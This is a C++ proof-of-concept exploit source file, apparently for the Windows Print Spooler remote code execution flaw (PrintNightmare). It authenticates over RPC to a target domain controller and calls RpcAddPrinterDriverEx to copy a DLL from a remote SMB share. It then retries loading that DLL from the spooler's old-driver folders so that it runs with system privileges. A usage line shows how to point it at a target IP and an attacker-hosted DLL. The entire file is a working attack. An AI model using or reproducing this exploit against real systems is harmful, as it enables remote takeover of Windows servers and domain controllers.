// POC.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include "resource.h"
//#include "stdafx.h"
#include "my_rpc.h"
#include <xpsprint.h>
#include <fstream>
#define RPC_USE_NATIVE_WCHAR
#include <stdio.h>
#include <tchar.h>
#include  <io.h>
#include <Windows.h>
#include <memory>
#include <string.h>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;

wchar_t uuid[MAX_PATH] = L"12345678-1234-abcd-ef00-0123456789ab";
WCHAR src_exp_path[0x200] = {0};
WCHAR dest_exp_path[0x200] = { 0 };
WCHAR exp_name[0x200] = { 0 };
WCHAR dc_ip[0x200] = { 0 };
WCHAR dc_path[0x200] = { 0 };
WCHAR username[0x200] = { 0 };
WCHAR password[0x200] = { 0 };

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	//status = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncalrpc",
		//NULL, NULL, nullptr, &StringBinding);

	status = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncacn_ip_tcp",
		(RPC_WSTR)dc_ip, NULL, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		//printf("[+]");
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

			_SEC_WINNT_AUTH_IDENTITY_A identity;
			identity.Domain = NULL;
			identity.DomainLength = 0;
			identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
			identity.User = (unsigned char*)username;
			identity.UserLength = lstrlenW(username);
			identity.Password = (unsigned char*)password;
			identity.PasswordLength = lstrlenW(password);
			

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, &identity, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				printf("[+] Binding successful!!\n");
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}


int wmain(int argc, wchar_t* argv[])
{
	if (argc != 5) {
		printf(".\\poc.exe dc_ip path_to_exp user_name password\n");
		printf("For example: \n");
		printf(".\\poc.exe  192.168.228.191 \\\\192.168.228.1\\test\\MyExploit.dll test 123 \n");
		return 0;
	}
	wsprintf(dc_ip, L"%s", argv[1]);
	wsprintf(dc_path, L"\\\\%s", argv[1]);
	wsprintf(src_exp_path, L"%s", argv[2]);
	wsprintf(exp_name, L"%s", wcsrchr(argv[2], '\\')+1);
	wsprintf(username, L"%s", argv[3]);
	wsprintf(password, L"%s", argv[4]);

	printf("[+] Get Info:\n");
	wprintf(L"[+] dc_ip: %s\n", dc_ip);
	wprintf(L"[+] dc_path: %s\n", dc_path);
	wprintf(L"[+] src_exp_path: %s\n", src_exp_path);
	wprintf(L"[+] exp_name: %s\n", exp_name);
	wprintf(L"[+] username: %s\n", username);
	wprintf(L"[+] password: %s\n\n", password);

	DRIVER_INFO_2 info;
	info.cVersion = 3;
	info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
	//info.pDataFile = (LPWSTR)L"\\\\192.168.228.1\\test\\MyExploit.dll";
	info.pDataFile = src_exp_path;
	
	info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL";
	info.pEnvironment = (LPWSTR)L"Windows x64";
	info.pName = (LPWSTR)L"123";
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	
	DRIVER_CONTAINER container_info;
	container_info.Level = 2;
	container_info.DriverInfo.Level2 = new DRIVER_INFO_2();
	container_info.DriverInfo.Level2->cVersion = 3;
	container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
	container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
	container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
	container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
	container_info.DriverInfo.Level2->pName = info.pName;
	RpcTryExcept
	{
		DWORD hr = RpcAddPrinterDriverEx(handle,
			dc_path,
			&container_info,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		printf("RpcAddPrinterDriverEx %d\n",hr);

		wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\%s", exp_name);
		container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
		hr = RpcAddPrinterDriverEx(handle,
			dc_path,
			&container_info,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
		if (hr == 0) return 0;


		wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\%s", exp_name);
		container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
		hr = RpcAddPrinterDriverEx(handle,
			dc_path,
			&container_info,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
		if (hr == 0) return 0;


		wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\%s", exp_name);
		container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
		hr = RpcAddPrinterDriverEx(handle,
			dc_path,
			&container_info,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
		if (hr == 0) return 0;

	}
	RpcExcept(1)
	{
		status = RpcExceptionCode();
		printf("RPC ERROR CODE %d\n", status);
	}
	RpcEndExcept


	

	
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}